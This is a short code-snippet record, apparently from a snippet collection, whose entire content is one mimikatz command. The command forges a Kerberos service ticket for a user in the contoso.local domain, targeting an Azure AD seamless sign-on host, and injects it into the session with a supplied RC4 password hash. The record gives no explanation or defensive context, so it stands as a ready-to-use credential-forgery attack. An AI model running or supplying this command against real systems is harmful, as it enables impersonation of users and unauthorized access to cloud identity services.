---
id: 2c71aee5-3478-4f42-971e-030d8a9c62d3
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:16.175394+00:00'
updated_at: '2023-04-10T20:19:22.601532+00:00'
---

# Code Snippet 2c71aee5

**Language**: Powershell

```powershell
mimikatz.exe "kerberos::golden /user:elrond
/sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234
/domain:contoso.local /rc4:f9969e088b2c13d93833d0ce436c76dd
/target:aadg.windows.net.nsatc.net /service:HTTP /ptt" exit
```


